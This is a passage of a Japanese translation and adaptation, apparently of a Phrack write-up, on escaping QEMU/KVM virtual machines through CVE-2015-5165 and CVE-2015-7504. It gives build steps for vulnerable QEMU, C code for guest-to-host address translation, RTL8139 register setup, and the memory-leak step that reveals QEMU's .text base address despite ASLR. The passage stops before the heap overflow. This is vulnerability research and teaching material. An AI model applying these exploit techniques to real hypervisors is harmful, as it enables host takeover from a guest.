# はじめに
現在，仮想マシンは個人でも商用利用でも多くの場面で利用されています．ネットワーク・セキュリティベンダーはマルウェア解析のためにを制限的かつ制御可能なマシンとしてVMを利用しています．ここで疑問が生じます．“マルウェアはVMを飛び出してホスト上で任意のコードが実行できるのでは？？”と．  
去年，CrowdStrikeのJson GeffnerはQEMUの仮想フロッピーディスクのコードにVMEscapeの可能性がある重大なバグを報告しました．ネットワーク・セキュリティ界隈で注目されたのにもかかわらず(名前がマーベルのVENOMを彷彿とさせるからでしょうが)，これははじめてのVMEscapeではないのです．  
2011年，Nelson ELhageはQEMUのPCIデバイスホットプラグの脆弱性をexploitしたことを報告しました．このエクスプロイトは[ここ](https://github.com/nelhage/virtunoid/blob/master/virtunoid.c)から閲覧できます．  

最近では，Qihoo360所属のXu LiuとShengping WangがHITB2016でKVM/QEMUのエクスプロイトを発表しました．このエクスプロイトは2つのネットワークカードデバイスエミュレータ(RTL8139とPCNET)に存在する2つの脆弱性(CVE-2015-5165 and CVE-2015-7504)を利用していました．発表ではホスト上で任意のコード実行までの概要を説明しましたが，exploitを再現するための技術的かつ詳細な説明はなされませんでした．  

この記事では，CVE-2015-5165(メモリリーク脆弱性)とCVE-2015-7504(ヒープオーバーフロー脆弱性)の2つの脆弱性について詳解します．この２つのエクスプロイトを組み合わせることによりVMから抜け出しホスト上で任意のコードを実行します！またQEMUのネットワークカードエミュレータ上の脆弱性をエクスプロイトする方法や，今後の新たな脆弱性で利用できるようなテクニックを説明します．例えば，共有メモリや共有コードを用いたインタラクティブバインドシェルなどです．

# KVM/QEMuについて
KVMはLinuxのカーネルモジュールで，完全仮想化基盤をユーザ空間上のプログラムに提供するための基盤です．KVM上ではWindowsやLinuxを無改造で複数のVMを動かすことができます．KVMのユーザスペース上のコンポーネントは主にQEMUで，これは特にデバイスミュレーションを担当します．

## 実験環境(筆者が付け加えた項目があります)
サンプルコードを試すための簡単な実験環境を用意しましょう！原文ママではハマる人もいると思うので詳細に書きます．それではいきますよ．  

まず，僕たちが扱う脆弱性は既に修正されているので，修正前のソースコードをcheckoutしなければなりません．それからQEMUをx86_64だけをターゲットにしてDEBUGモードをオンにしてビルドします．

```sh
$ git clone git://git.qemu-project.org/qemu.git
$ cd qemu
$ git checkout bd80b59
$ mkdir -p bin/debug/native
$ cd bin/debug/native
$ ../../../configure --target-list=x86_64-softmmu --enable-debug \
$                    --disable-werror --disable-xen
$ make
```

記事時点ではGCC 4.9.2でビルドしている．  
次に仮想マシンを起動する．  
```
$ ./qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \
$    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \
$    -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \
$    -drive file=<path_to_image>,format=qcow2,if=ide,cache=writeback
```

このコマンドで2GBのRAMとRTL8139とPCNETの2つのNICを持つVMを生成した．記事ではDebian 7 running a 3.16 kernel on x_86_64の環境である．

## QEMUのメモリレイアウト
ゲストの物理アドレスはQEMU専用の仮想アドレスにmmapされる．QEMUがゲストのためにメモリ確保しているときはPROT_EXEC(実行フラグ)が立っていないことに注意してほしい．
```
                        Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
                     \__   Page Table     \__
                        \                    \
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
                    \__                                        \__
                       \                                          \
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++
```
この図がおおまかなマッピングである．
またQEMUはBIOSとROM用にメモリを確保する．
`/proc/PID/maps`から確認できる．[memory](https://github.com/qemu/qemu/blob/master/docs/devel/memory.txt)

## アドレス解決
QEMUには2つのアドレス解決レイヤがある．
* ゲスト仮想アドレス(GVA)からゲスト物理アドレス(GPA)への変換をするレイヤ．今回のエクスプロイトではDMAアクセスするネットワークカードデバイスをつくる．
* ゲストの物理アドレス(GPA)からホストの仮想アドレス(HVA)へと変換するレイヤ．改変した構造体のデータをここに挿入して，そのアドレスを知る必要がある．

x64では仮想アドレスは4KBページならPageEntry(PE)，PageDirectory(PD)，PageDirectoryPointer(PDP)，PML4(PageMapLevel4)で表現される．  
LinuxではCAP_SYS_ADMINケイパビリティを持つユーザプロセスが物理アドレスフレームが解決できるpagemapにアクセスできる．pagemapには以下のような内容が記されている．
- Bits 0-54  : physical frame number if present.
- Bit  55    : page table entry is soft-dirty.
- Bit  56    : page exclusively mapped.
- Bits 57-60 : zero
- Bit  61    : page is file-page or shared-anon.
- Bit  62    : page is swapped.
- Bit  63    : page is present.

以下のプログラムはメモリをmmapし，“Where am I?”という文字列を格納し，その物理アドレスを表示する．

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int main()
{
    uint8_t *ptr;
    uint64_t ptr_mem;
    
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    
    ptr = malloc(256);
    strcpy(ptr, "Where am I?");
    printf("%s\n", ptr);
    ptr_mem = gva_to_gpa(ptr);
    printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem);

    getchar();
    return 0;
}
```
このプログラムをゲストでroot権限で実行し，ホストからgdbアタッチしてみる．  
```c
root@yayoi:/home/moly# gdb -p 11641
(gdb) info proc mappings
process 11641
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x55a3b038e000     0x55a3b1087000   0xcf9000        0x0 /home/moly/phrack/aa/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
      0x55a3b1286000     0x55a3b1397000   0x111000   0xcf8000 /home/moly/phrack/aa/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
      0x55a3b1397000     0x55a3b1551000   0x1ba000   0xe09000 /home/moly/phrack/aa/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
      0x55a3b1551000     0x55a3b1583000    0x32000        0x0 
      0x55a3b33a7000     0x55a3b45a0000  0x11f9000        0x0 [heap]
...
      0x7f4747e00000     0x7f47c7e00000 0x80000000        0x0  <- HVA!!!
...
      0x7f47e2e46000     0x7f47e2e47000     0x1000        0x0 
      0x7ffd67ae3000     0x7ffd67b05000    0x22000        0x0 [stack]
      0x7ffd67b6a000     0x7ffd67b6d000     0x3000        0x0 [vvar]
      0x7ffd67b6d000     0x7ffd67b6f000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

(gdb) x/s 0x7f4747e00000+0x2bb02260
0x7f4773902260:    "Where am I?"
```
gdbの`info proc mappings`でメモリマップを表示し，ゲストの物理アドレス(GPA)がマップされたホストの仮想アドレス(HVA)を見つける．
HVAにプログラムの出力したゲストの物理アドレスを足して，文字列表示してみると"Where am I?"が見事表示される．つまりゲストの物理アドレスを自らの手で解決したことになる！


# メモリリークエクスプロイト
これからCVE-2015-5165のエクスプロイトを行う．この脆弱性はRTL8139ネットワークカードのエミュレータに脆弱性があるため，エクスプロイトするためには脆弱性をつくようなデータをQEMUに挿入する必要がある．次の2つのアドレスがエクスプロイトの鍵となる．

- .textセクションのベースアドレス(shellcode挿入用)
- ゲスト用の物理ベースアドレス(細工されたデータのアドレスをしるため)

## 脆弱性のあるコード
リアルテックのネットワークカードには`C`(受信)と`C+`(送信)というふたつのモードがある．`C+`モード，つまり送信モードの際，この脆弱なコードは誤って実際よりの多くのIPパケットデータを送ろうとする．  
問題は`hw/net/rtl8139.c`にある`rtl8139_cplus_transmit_one`関数だ．  

```c
/* ip packet header */
ip_header *ip = NULL;
int hlen = 0;
uint8_t  ip_protocol = 0;
uint16_t ip_data_len = 0;

uint8_t *eth_payload_data = NULL;
size_t   eth_payload_len  = 0;

int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12));
if (proto == ETH_P_IP)
{
    DPRINTF("+++ C+ mode has IP packet\n");

    /* not aligned */
    eth_payload_data = saved_buffer + ETH_HLEN;
    eth_payload_len  = saved_size   - ETH_HLEN;

    ip = (ip_header*)eth_payload_data;

    if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) {
        DPRINTF("+++ C+ mode packet has bad IP version %d "
            "expected %d\n", IP_HEADER_VERSION(ip),
            IP_HEADER_VERSION_4);
        ip = NULL;
    } else {
        hlen = IP_HEADER_LENGTH(ip);
        ip_protocol = ip->ip_p;
        ip_data_len = be16_to_cpu(ip->ip_len) - hlen;
	}
}
```
IPヘッダには`hlen`と`ip->ip_len`の2つのメンバがある．`hlen`はIPヘッダの長さ(オプション無しのパケットで20byte)で，`ip->ip_len`はipヘッダを含むIPパケットすべての長さである．先程のコードではIPデータの長さ(`ip_data_len`)を計算するのに，`ip->ip_len >= hlen`であることを確認していない．`ip_data_len`は符号なし整数なので整数オーバーフローが起こる．したがって，実際に送ることのできるより多くのデータが送信可能である．つまり送信バッファにてバッファオーバーフロー攻撃が可能となる．  
次に，`ip_data_len`はTCPデータの長さの計算の際に使用されるが，IPからTCPにパケットがくるまれるとき，データがTCPの構造体へとコピーされるわけだが，このデータがMTUより大きい場合，1つ１つmallocされるheap領域にコピーされる．

```c
int tcp_data_len = ip_data_len - tcp_hlen;
int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;

int is_last_frame = 0;

for (tcp_send_offset = 0; tcp_send_offset < tcp_data_len;
    tcp_send_offset += tcp_chunk_size) {
    uint16_t chunk_size = tcp_chunk_size;

    /* check if this is the last frame */
    if (tcp_send_offset + tcp_chunk_size >= tcp_data_len) {
        is_last_frame = 1;
        chunk_size = tcp_data_len - tcp_send_offset;
    }

    memcpy(data_to_checksum, saved_ip_header + 12, 8);

    if (tcp_send_offset) {
        memcpy((uint8_t*)p_tcp_hdr + tcp_hlen,
                (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset,
                chunk_size);
    }

    /* more code follows */
}
```

したがって，変な長さのパケットを作ることができれば(`ip->ip_len = hlen - 1`のような)，64KBものQEMUでのヒープオーバーフローを起こせる．1パケットも送信することなく，43の分割されたパケットを送信できる．

## ネットワークカードを設定する
細工したパケッを送り，データを読み出すには送受信用のNICのバッファを用意する必要がある．また，あるフラグを立てて，確実に先程の脆弱なコードが実行されるようにしなければならない．  

```
            +---------------------------+----------------------------+
    0x00    |           MAC0            |            MAR0            |
            +---------------------------+----------------------------+
    0x10    |                       TxStatus0                        |
            +--------------------------------------------------------+
    0x20    |                        TxAddr0                         |
            +-------------------+-------+----------------------------+
    0x30    |        RxBuf      |ChipCmd|                            |
            +-------------+------+------+----------------------------+
    0x40    |   TxConfig  |  RxConfig   |            ...             |
            +-------------+-------------+----------------------------+
            |                                                        |
            |             skipping irrelevant registers              |
            |                                                        |
            +---------------------------+--+------+------------------+
    0xd0    |           ...             |  |TxPoll|      ...         |
            +-------+------+------------+--+------+--+---------------+
    0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |
            +-------+------+------------+------------+---------------+
```

上の図がRTL8139のレジスタである．
- TxConfig: Tx(送信)のフラグ TxLoopBack，TxCRC，etc.
- RxConfig: Rx(受信)のフラグ AcceptBroadcast, AcceptMulticast , etc.
- CpCmd: C+(送信モード)用のコマンドレジスタ 指定されたコマンドを行わせる CplusRxEnd (enable receive), CplusTxEnd (enable transmit), etc.
- TxAddr0: Txディスクリプタの物理アドレス
- RxRingAddrLO: ディスクリプタテーブルの物理アドレスの下位32bit
- RxRingAddrHI: Rxディスクリプタテーブルの物理アドレスの上位32bit
- TxPoll: NICに送信させるように通知するレジスタ

```c
struct rtl8139_desc {
    uint32_t dw0;
    uint32_t dw1;
    uint32_t buf_lo; //物理アドレスの下位32bit
    uint32_t buf_hi; //物理アドレスの上位32bit
};
```
送受信ディスクリプタは上のような構造体になっている．
`buf_lo`と`buf_lo`はディスクリプタのアドレスで，ディスクリプタはページアラインドである必要がある．  
`dw0`はバッファのサイズを追加のフラグ(バッファがだれに保持されているかを示すownership flagなど)でエンコードしたものである．  
ネットワークカードは`in()`や`out()`などのI/Oポートアクセス関数で設定できる．

次のコードはTxディスクリプタを1つ設定するコードである．
```c
#define RTL8139_PORT        0xc000
#define RTL8139_BUFFER_SIZE 1500

struct rtl8139_desc desc;
void *rtl8139_tx_buffer;
uint32_t phy_mem;

rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);
phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);

memset(&desc, 0, sizeof(struct rtl8139_desc));

desc->dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |
             CP_TX_IPCS | CP_TX_TCPCS;
desc->dw0 += RTL8139_BUFFER_SIZE;

desc.buf_lo = phy_mem;

iopl(3);

outl(TxLoopBack, RTL8139_PORT + TxConfig);
outl(AcceptMyPhys, RTL8139_PORT + RxConfig);

outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);
outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);

outl(phy_mem, RTL8139_PORT + TxAddr0);
outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);

```

## エクスプロイト
エクスプロイトコードはまずTx/Rxバッファの設定をレジスタを通じて行う．次に悪意のあるパケットを送りつけて，Rxバッファよりリークされたデータを読み出す．
読み出されたデータを確認すると，いくつかの関数ポインタがみえてくる．これらは以下に示すQEMU内部の構造体のメンバである．

```c
typedef struct ObjectProperty
{
    gchar *name;
    gchar *type;
    gchar *description;
    ObjectPropertyAccessor *get;
    ObjectPropertyAccessor *set;
    ObjectPropertyResolve *resolve;
    ObjectPropertyRelease *release;
    void *opaque;

    QTAILQ_ENTRY(ObjectProperty) node;
} ObjectProperty;
```

QEMUはデバイスやメモリ領域をオブジェクトで管理している．起動時に，こうしたオブジェクトを生成し，デバイスやメモリ領域にプロパティを割り当てる．例えば，次のコードはメモリ領域オブジェクトに`may-overlap`というプロパティを設定する．

```c
object_property_add_bool(OBJECT(mr), "may-overlap",
                         memory_region_get_may_overlap,
                         NULL, /* memory_region_set_may_overlap */
                         &error_abort);
```

このプロパティはオブジェクトのgetterメソッドから取得できる．  

RTL8139NICエミュレータはヒープ領域から64KBを悪意のあるパケットのために確保する．この領域は他のfreeされたプロパティの上に確保されている可能性が高いです．  

このエクスプロイトではリークされたメモリから`ObjectProperty`構造体(80bytes)を探し当てます．`ObjectProperty`構造体には関数ポインタがあるので，たとえASLRが有効であっても`.text`セクションのベースアドレスを得ることができます．ページアラインドであるということは，下位12bit目は固定です(4kbページングより)．`.text`セクションのベースアドレスがわかれば，QEMUの関数が利用できます．またPLT領域からlibcの関数アドレスすらもわかるのです！また私達は`PHY_MEM`+`0x78`のようなアドレスが何回も出現すれば，`PHY_MEM`はゲストの物理アドレス(GPA)のベースアドレスだとわかった．(ほんまか？どうして？わからん……)  
さて，ここまででQEMUの`.text`セグメントのベースアドレスと，QEMUのゲスト物理アドレス(GPA)がわかった．
